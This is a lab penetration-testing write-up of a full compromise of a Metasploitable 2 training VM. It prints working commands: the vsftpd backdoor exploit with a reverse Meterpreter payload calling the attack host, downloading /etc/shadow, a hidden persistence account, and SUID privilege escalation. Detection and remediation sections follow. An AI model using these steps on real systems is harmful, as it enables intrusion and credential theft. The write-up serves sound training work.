---
layout: page
title: "Metasploitable 2: Full Compromise via vsftpd Backdoor"
platform: Metasploitable 2
skills: [Enumeration, Vulnerability Identification, Payload Selection, Privilege Escalation, Log Analysis/Detection, Reporting]
date: 2026-11-11
writeup: true
---

This engagement takes a single intentionally vulnerable host from first contact to full root compromise, then through post-exploitation: enumeration of sensitive data, a persistence account, and exfiltration hidden inside an image. One clean path to root is enough; the point is demonstrating the full kill chain end to end and being able to argue why each choice was made, then switching to the defender's chair.

## Overview

- **Target:** Metasploitable 2 at 192.168.56.101
- **Attack host:** Kali Linux at 192.168.56.102
- **Network:** isolated VirtualBox host-only network (192.168.56.0/24), with no route to the internet or any third party during offensive activity
- **Scope / goal:** full enumeration, then root via a confirmed unauthenticated path, followed by post-exploitation
- **Date:** 6 October 2026

Both VMs are owned by me and confined to a host-only network; Metasploitable 2 is a purpose-built training image. There is no authorisation ambiguity. Without that ownership and contained scope, the same techniques against an unauthorised target would be an offence under South Africa's Cybercrimes Act (Act 19 of 2020).

## Executive Summary

The target was fully compromised within minutes by an unauthenticated attacker with no prior credentials, via a backdoored FTP service (vsftpd 2.3.4, CVE-2011-2523). The resulting shell ran as root, so no privilege escalation was needed, and every account hash, configuration file and sensitive document on the host was immediately exposed. From that position a persistence account was created and a sensitive file was exfiltrated using steganography to prove impact. Several other critical vulnerabilities (Samba, distccd, UnrealIRCd) were identified but not exploited, as a single clean compromise path was enough to demonstrate full impact. The priority fix is to remove the backdoored service and bring the host onto a managed patch cycle.

## Enumeration

Discovery and service mapping. The version string on each service is what drives every downstream decision, so it was captured deliberately rather than as one undifferentiated scan.

**Host discovery.** A ping sweep of the host-only subnet identified the live target, cross-checked against `ifconfig` run directly on the Metasploitable console:

```
nmap -sn 192.168.56.0/24
```

![ifconfig on the target console confirming 192.168.56.101]({{ '/writeups/metasploitable-2/images/01-ifconfig-target-ip.png' | relative_url }})

The console confirms the target at 192.168.56.101 on `eth0`, with a VirtualBox MAC (08:00:27:45:90:d4) confirming it is a VM.

**Service and version scan.**

```
nmap -sV 192.168.56.101
```

![nmap service and version scan results]({{ '/writeups/metasploitable-2/images/02-nmap-service-scan.png' | relative_url }})

The scan returns a large, deliberately vulnerable attack surface. The services that matter for this path and the documented alternatives:

| Port | Service | Version | Note |
|------|---------|---------|------|
| 21 | FTP | vsftpd 2.3.4 | Known backdoor; primary target |
| 22 | SSH | OpenSSH 4.7p1 | Legacy |
| 23 | Telnet | Linux telnetd | Cleartext |
| 25 | SMTP | Postfix smtpd | Anonymous DH supported |
| 80 | HTTP | Apache 2.2.8 (DAV/2) | Hosts DVWA, Mutillidae |
| 139/445 | SMB | Samba smbd 3.x | `usermap_script` RCE candidate |
| 3306 | MySQL | 5.0.51a | Blank root password candidate |
| 3632 | distccd | v1 | Unauthenticated RCE candidate |
| 6667 | IRC | UnrealIRCd | Backdoor candidate |
| 8180 | HTTP | Apache Tomcat/Coyote | Default creds common |

## Vulnerability Identification

The enumeration was turned into a ranked list of findings. An NSE vulnerability scan confirmed the leads, and service versions were cross-referenced against NVD/CVE.org. Ratings use likelihood × impact (see the [Methodology]({{ '/methodology/' | relative_url }})); severity is judged on achievable impact on this host, not scanner output alone.

```
sudo nmap --script vuln 192.168.56.101
```

![nmap vuln scan showing the vsftpd 2.3.4 backdoor finding]({{ '/writeups/metasploitable-2/images/03-nmap-vuln-vsftpd.png' | relative_url }})

The scan flags the vsftpd 2.3.4 backdoor as VULNERABLE (Exploitable), with its own check running `id` and returning `uid=0(root)`, confirming root code execution before a single exploit was launched. It also reports an anonymous Diffie-Hellman MitM weakness on the TLS services.

![nmap vuln scan showing POODLE, weak DH and CCS injection]({{ '/writeups/metasploitable-2/images/04-nmap-vuln-ssl.png' | relative_url }})

Further down, the PostgreSQL TLS stack shows POODLE (CVE-2014-3566), an insufficient-strength 1024-bit DH group, and CCS injection (CVE-2014-0224).

| ID | Finding | CVE | Likelihood | Impact | Risk | Justification (likelihood × impact) |
|------|---------|-----|------------|--------|------|-------------------------------------|
| F-01 | vsftpd 2.3.4 backdoor | CVE-2011-2523 | High | High | **Critical** | Network-reachable, unauthenticated, trivially triggered, public module, scanner already proved `id` → root. Spawns a shell running as root. |
| F-02 | Samba `usermap_script` RCE | CVE-2007-2447 | Medium | High | **Critical** | A second unauthenticated root path; not needed once F-01 succeeded. |
| F-03 | MySQL blank root password | CWE-521 | Medium | High | **High** | Full read access to every database, a confidentiality breach. |
| F-04 | distccd unauth RCE | CVE-2004-2687 | Medium | Medium | **High** | Shell as the distcc user; would need chaining to reach root. |
| F-05 | Cleartext TLS / POODLE / weak DH | CVE-2014-3566 | Low | Medium | **Medium** | MitM / passive decryption on a shared segment. |

## Exploitation

**Chosen path: the vsftpd 2.3.4 backdoor (F-01).** Why this one over Samba, distcc or MySQL: it is unauthenticated, needs no privilege escalation (the daemon already runs as root), carries the highest confidence of a clean single-shot compromise, and the scanner had already proven root execution. The backdoor triggers on an FTP username containing `:)`, opening a root listener on TCP 6200.

```
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
```

![msfconsole search vsftpd and module selection]({{ '/writeups/metasploitable-2/images/05-msf-search-use.png' | relative_url }})

The search returns two matches; module 1, `exploit/unix/ftp/vsftpd_234_backdoor`, is ranked *excellent*. Selecting it loads a `cmd/linux/http/x86/meterpreter_reverse_tcp` payload.

**Payload choice.** A reverse Meterpreter was used, with `LHOST 192.168.56.102` and `LPORT 4444`. On an isolated host-only segment the target can always reach the attacker, so a reverse connection is safe; a bind shell (`cmd/unix/bind_netcat`) would be the fallback on a firewalled or NAT'd network where the callback could not return. Meterpreter was chosen over a plain shell for the richer post-exploitation tooling.

```
set RHOSTS 192.168.56.101
exploit
```

![exploit firing and a Meterpreter session opening]({{ '/writeups/metasploitable-2/images/06-msf-exploit-session.png' | relative_url }})

Metasploit's automatic check confirms the banner (`220 (vsFTPd 2.3.4)`), reports "Backdoor has been spawned!", and opens a Meterpreter session (192.168.56.102:4444 → 192.168.56.101) at 07:45:41. No credentials or escalation were required.

![sysinfo and getuid confirming root]({{ '/writeups/metasploitable-2/images/07-meterpreter-root.png' | relative_url }})

```
meterpreter > sysinfo
Computer : metasploitable.localdomain
OS       : Ubuntu 8.04 (Linux 2.6.24-16-server)
meterpreter > getuid
Server username: root
```

This is textbook unauthenticated remote code execution leading to immediate full compromise, with no escalation step because the vulnerable daemon itself runs as root.

**Documented alternative paths (not run; one clean compromise is sufficient):**

- **Samba `usermap_script` (CVE-2007-2447):** `use exploit/multi/samba/usermap_script` with a `cmd/unix/reverse` or `bind_netcat` payload; confirm with `id`. If no session, verify the option is enabled first with `nmap -p139,445 --script smb-vuln*`.
- **MySQL blank root:** `auxiliary/scanner/mysql/mysql_login` with `BLANK_PASSWORDS true`, then `mysql -h <target> -u root`. If remote root is blocked, run `mysql -u root` locally from the root shell already held, which bypasses host restrictions via the local socket.
- **distccd (CVE-2004-2687):** `use exploit/unix/misc/distcc_exec` yields a shell as the distcc user, which would need chaining with a local privesc (such as the SUID-nmap technique below) to reach root.

## Impact / Post-Exploitation

**Privilege level.** Root from the initial shell, with no escalation required.

**Enumerating sensitive data.** From the root Meterpreter shell, the account and credential stores were read:

```
cat /etc/passwd      # 30+ accounts: msfadmin, user, service, joselin + service accounts
cat /etc/shadow      # readable only as root, every password hash exposed
cat /etc/crontab     # no pre-existing attacker persistence
```

`/etc/shadow` exposed every account's hash, several using the weak, outdated MD5-crypt (`$1$`) scheme; the remediation target is migration to yescrypt or SHA-512 (`$y$` / `$6$`).

**Exfiltration of the password hashes.** The objective was to exfiltrate `/etc/shadow` from the target onto the attacking host. Using the existing Meterpreter session, the file was pulled straight back to Kali:

```
meterpreter > download /etc/shadow /root/loot/shadow
```

The local copy was then verified with `ls -l /root/loot/shadow` and `head /root/loot/shadow`, confirming the genuine account and hash entries had left the target. In a real engagement this is the point at which offline password cracking (John the Ripper or Hashcat against the weak `$1$` hashes) would begin, turning stolen hashes into usable credentials.

**Persistence.** A local account was created to simulate maintained access surviving a reboot:

```
useradd -m -s /bin/bash hacker
usermod -p $(openssl passwd -1 P@ssw0rd123) hacker
grep hacker /etc/passwd    # hacker:x:1004:1008::/home/hacker:/bin/bash
```

**Privilege escalation (documented alternative, not needed here).** To show the pattern from a low-privilege foothold: SSH in as `msfadmin`, then abuse the SUID `nmap --interactive` binary (`!sh`) to inherit a root context. SUID makes a binary run as its owner (root) regardless of who launched it.

**Consequence in one line.** Root on this host means every credential, configuration file and sensitive document is readable, the password hashes can be cracked offline, the host can pivot across the segment, and attacker access survives a reboot via the persistence account.

## Detection Evidence

The defender's half, and the part that sets this apart. For each attacker action, the artefact a blue team would see:

- **The scans.** The service and vuln scans are loud: a burst of connection attempts to sequential ports from one source in a short window, which an IDS portscan preprocessor (e.g. Snort) would flag.
- **The backdoor trigger.** An FTP `USER` command containing `:)` followed by a new connection to TCP 6200, then the reverse Meterpreter callback to the attacker on 4444. In a packet capture, filter `ftp` for the malicious username, and `tcp.port == 6200 || tcp.port == 4444` for the shell channels, then follow the TCP stream.
- **The root shell.** The vsftpd backdoor path leaves little host-side log evidence, which is itself a finding: detection has to come from the network and from endpoint process monitoring, not from auth logs.
- **The persistence account.** This is the highest-value detection. `useradd` writes to `/var/log/auth.log`, and a new line appears in `/etc/passwd` and `/etc/shadow`. Unauthorised account creation should be a standing alert.
- **The exfiltration.** The `/etc/shadow` download rides the existing session rather than opening a new channel, so it blends into established traffic; egress filtering and volume-based alerting are what catch this, not signatures.

Mapped to the two clearest log sources for this trail: `/var/log/vsftpd.log` records the malicious FTP login carrying the `:)` username, stamped with the Kali source IP and the exploitation timestamp, while `/var/log/auth.log` records the `useradd` that created the persistence account. The scan itself leaves little trace, so the exploitation and the account creation are the most probative entries.

## Recommendations

One concrete fix per finding, highest risk first.

| Finding | Fix |
|---------|-----|
| vsftpd 2.3.4 backdoor | Remove or replace with a current, officially-signed build; verify package checksums before install; restrict FTP to trusted networks or replace with SFTP. |
| Anonymous FTP login | Disable anonymous access entirely. |
| Samba `usermap_script` | Patch Samba; disable the `username map script` option; enable SMB signing. |
| MySQL blank root | Set a strong unique password; restrict database network access to application servers only. |
| Cleartext services (Telnet/rsh) | Disable the legacy unencrypted services; standardise on SSH. |
| Weak TLS (POODLE, weak DH, CCS) | Disable SSLv2/SSLv3; enforce TLS 1.2+; use DH groups ≥ 2048 bits; patch OpenSSL. |
| Weak password hashes (`$1$`) | Migrate to yescrypt/SHA-512 and force a password reset. |
| General | Apply a regular patch cadence; run periodic vulnerability scans; segment legacy hosts; deploy egress filtering and IDS; **alert on unauthorised account creation**. |

## Lessons Learned

- **What worked:** capturing version strings service by service during enumeration meant the exploit choice was effectively made before I opened Metasploit, and the NSE vuln scan proved `id` → root before I committed to the path.
- **What was slow or clumsy:** I relied on the automated scanners first; next time I would cross-reference versions to CVEs by hand in parallel, rather than waiting on the scan to decide what to chase.
- **On process:** evidence discipline matters as much as technical execution: capturing clean, timestamped proof at each stage keeps an assessment defensible. I now work to a structured capture checklist so the written record is complete by the time the engagement ends.
- **The detection gap I noticed:** the backdoor path left almost nothing in the host logs, but the persistence account was loud. That tells a defender where to invest: network monitoring and account-creation alerting catch this attack where auth logs do not.
- **One thing I now understand that I did not before:** why "unauthenticated RCE as root" outranks a higher-CVSS finding that still needs a foothold. Reachability and prerequisites matter as much as the raw score.
